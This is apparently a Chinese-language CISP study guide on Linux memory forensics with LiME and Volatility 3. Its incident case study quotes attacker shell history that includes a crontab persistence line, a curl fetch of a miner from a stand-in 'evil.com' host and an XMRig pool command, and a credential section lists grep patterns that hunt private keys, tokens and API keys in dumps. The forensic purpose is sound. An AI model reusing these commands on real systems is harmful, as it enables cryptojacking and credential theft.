# Linux 内存取证实战：Volatility 3 从入门到精通

> **📘 文档定位**：CISP 考试 应急响应 高级专题 | 难度：⭐⭐⭐⭐ | 预计阅读：30 分钟
>
> 深入讲解 Volatility 3 在 Linux 内存取证中的应用，覆盖进程分析/网络连接/内核模块/文件提取/Bash 历史等核心插件，是应急响应人员内存取证的核心技能。

---

## 导航目录

- [一、内存取证基础](#一内存取证基础)
- [二、Volatility 3 环境搭建](#二volatility-3-环境搭建)
- [三、核心插件实战](#三核心插件实战)
- [四、恶意软件检测](#四恶意软件检测)
- [五、时间线构建](#五时间线构建)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [内存取证价值](#一为什么内存取证)
2. [内存镜像采集](#二镜像采集)
3. [Volatility 3 核心插件](#三volatility核心)
4. [恶意代码检测](#四恶意代码检测)
5. [凭据提取](#五凭据提取)
6. [Rootkit 检测](#六rootkit检测)
7. [完整分析案例](#七完整案例)

---

## 一、为什么内存取证

```
磁盘 vs 内存:

磁盘证据: 文件、日志、时间戳 (静态)
内存证据: 运行中的进程、网络连接、加密密钥、
          注入代码、Rootkit、用户凭据 (动态)

关键证据只在内存:
  ✓ 恶意代码可能只在内存中运行(无文件落地)
  ✓ C2 通信信息(IP/端口/加密密钥)
  ✓ 进程注入的恶意代码
  ✓ 用户凭据(密码哈希/Kerberos票据)
  ✓ 加密容器的解密密钥
  ✓ Rootkit 隐藏的进程/文件/网络
```

---

## 二、镜像采集

### 2.1 Linux 采集

```bash
# LiME (Linux Memory Extractor) — 推荐

# 安装编译
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make

# 本地保存
insmod lime.ko "path=/tmp/memory.lime format=lime"

# TCP发送到取证服务器(不落地, 更安全)
insmod lime.ko "path=tcp:192.168.1.100:4444 format=lime"

# 取证服务器监听:
nc -lvp 4444 > memory.lime

# 注意: 
# ✦ 采集工具本身会占用内存 → 可能覆盖少量证据
# ✦ 优先远程采集(不写入本地磁盘)
# ✦ 采集后立即记录SHA256哈希
sha256sum memory.lime > memory.lime.sha256
```

### 2.2 Volatility 3 安装

```bash
pip install volatility3

# Volatility 3 vs 2:
# v3: Python 3 + 自动识别OS + 插件式架构
# v2: Python 2 + 需要指定profile (已被v3取代)
```

---

## 三、Volatility 核心

### 3.1 基础分析流程

```bash
# ===== Step 1: 确定 OS 版本 =====
vol -f memory.lime linux.info
# 输出: Linux 5.13.0-xxx (Ubuntu 20.04)
# 确定是 Linux → 使用 linux.* 插件

# ===== Step 2: 进程分析 =====
# 进程列表
vol -f memory.lime linux.pslist
vol -f memory.lime linux.pstree    # 进程树(更好看父子关系)
vol -f memory.lime linux.psaux     # 含命令行参数

# 可疑进程特征:
# - 名称异常: [kworker] / random_string
# - 路径异常: /tmp/xxx /dev/shm/xxx
# - 父进程异常: java → /bin/bash (WebShell)
# - CPU超高: >80% (挖矿)

# ===== Step 3: 网络连接 =====
vol -f memory.lime linux.sockstat  # 所有socket
vol -f memory.lime linux.netscan   # 更全面的网络扫描

# 找外网连接(排除内网):
vol -f memory.lime linux.netscan | 
  grep -v "127.0.0.1\|10\.\|192.168\.\|172.16"

# ===== Step 4: 文件系统 =====
vol -f memory.lime linux.lsof      # 打开的文件
vol -f memory.lime linux.filescan  # 所有文件对象

# ===== Step 5: 命令行历史 =====
vol -f memory.lime linux.bash      # Bash历史
# → 可能找到攻击者执行的命令!
```

### 3.2 进程 Dump

```bash
# 导出整个进程内存
vol -f memory.lime linux.proc_dump --pid 1234 --dump-dir ./dumps/

# 分析dump:
strings pid.1234.elf | grep -E "password|secret|token|api_key|BEGIN"
strings pid.1234.elf | grep -E "http|https|\.com|\.net" | sort -u
```

---

## 四、恶意代码检测

### 4.1 检测隐藏进程

```bash
# 方法1: 对比 pslist 和 直接搜索
ps_count=$(vol -f memory.lime linux.pslist 2>/dev/null | wc -l)

# 方法2: 遍历 /proc 模拟
# /proc 中应该有对应的目录，Volatility 可检测隐藏

# 方法3: 通过 task_struct 链表
vol -f memory.lime linux.check_idt   # 检查IDT表(可能的Rootkit)
vol -f memory.lime linux.check_syscall  # 检查系统调用表
```

### 4.2 注入代码检测

```bash
# 检测: 匿名可执行内存 (RWX 权限)
vol -f memory.lime linux.malfind

# 特征: 
# - VMA 权限为 RWX (可读可写可执行)
# - 通常只有 JIT 编译器会申请 RWX 内存
# - 如果普通进程有大量 RWX 页 → 可疑!
```

### 4.3 内核模块检测

```bash
# 查看已加载的内核模块
vol -f memory.lime linux.lsmod

# 检查: 是否有隐藏的内核模块?
# 对比 lsmod 列表和 /proc/modules
# 差异 = 可能的 Rootkit 模块

# 检查内核模块是否被篡改
vol -f memory.lime linux.check_modules
```

---

## 五、凭据提取

### 5.1 用户凭据

```bash
# 从内存提取字符串 → 搜索凭据
vol -f memory.lime linux.proc_dump --pid 1 --dump-dir ./dumps/
# 在某些进程内存中可能找到:
strings ./dumps/* | grep -iE "password|passwd|secret"

# SSH 密钥
strings ./dumps/* | grep -E "BEGIN.*PRIVATE KEY"

# 环境变量(可能含密钥)
vol -f memory.lime linux.envars --pid <可疑进程PID>
```

### 5.2 加密密钥

```bash
# 搜索 AES 密钥特征(256位 = 32字节高熵)
strings memory.lime | grep -E "^[A-Za-z0-9+/=]{44}$" | sort -u

# 搜索证书私钥
strings memory.lime | grep -E "BEGIN (RSA|EC) PRIVATE KEY"

# 搜索 JWT Token
strings memory.lime | grep -E "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"

# 搜索 API Key
strings memory.lime | grep -E "sk-[A-Za-z0-9]{32,}"
```

---

## 六、Rootkit 检测

### 6.1 系统调用表检测

```bash
# 检测被 Hook 的系统调用
vol -f memory.lime linux.check_syscall

# 正常: 系统调用地址在 vmlinux 范围内
# 异常: 地址在未知模块范围 → Hooked!
```

### 6.2 IDT 表检测

```bash
# 检测中断描述符表
vol -f memory.lime linux.check_idt

# 检测: IDT 条目地址是否异常
```

---

## 七、完整案例

```
场景: 某企业 Linux 服务器 CPU 100%

Phase 1: 发现
  top → 进程 [kworker] 占用 800% CPU (8核)
  kill -9 → 进程消失但3分钟后重生
  → 有守护进程在维护!

Phase 2: 采集
  insmod lime.ko "path=tcp:192.168.1.100:4444 format=lime"
  → 传输到取证服务器

Phase 3: Volatility 分析

  ① 进程分析
    vol -f memory.lime linux.psaux | grep -v "^$"
    → 发现:
      PID 9876: /tmp/.cache/kworker (100% CPU)
      PID 9877: /tmp/.cache/syslogd (管理进程)

  ② 网络连接
    vol -f memory.lime linux.netscan
    → 进程 9876 连接:
      TCP: 45.xxx.xxx.xxx:4444 (矿池!)
      TCP: 51.xxx.xxx.xxx:3333 (备用矿池)

  ③ 持久化检查
    vol -f memory.lime linux.bash
    → 历史命令:
      echo "*/5 * * * * /tmp/.cache/syslogd" >> /etc/crontab
      curl http://evil.com/miner.tar.gz | tar xz
      ./xmrig -o pool.supportxmr.com:3333

  ④ 提取样本
    vol -f memory.lime linux.proc_dump --pid 9876 --dump-dir ./malware/
    → 上传到 VirusTotal → 确认为 XMRig 挖矿

Phase 4: 溯源入口
  vol -f memory.lime linux.bash
  → grep "Accepted" /var/log/auth.log
  → root 从 1.2.3.4 登录(弱口令 root/123456)

Phase 5: 清除
  rm -rf /tmp/.cache/
  crontab -r
  passwd root → 强密码
  PermitRootLogin no

结论: 从内存镜像获得的证据包括:
  ✓ 恶意进程 PID/命令行/网络连接
  ✓ 攻击者执行的命令(bash历史)
  ✓ 持久化机制(crontab)
  ✓ 入侵入口(SSH弱口令)
```

---

## ✅ 内存取证 Checklist

- [ ] 采集内存镜像(LiME)
- [ ] 记录SHA256哈希
- [ ] Volatility 基础分析(ID→进程→网络→文件)
- [ ] 检测隐藏进程/注入代码
- [ ] 凭据搜索
- [ ] Rootkit检测
- [ ] 导出恶意进程(样本分析)
- [ ] 构建时间线+入口溯源
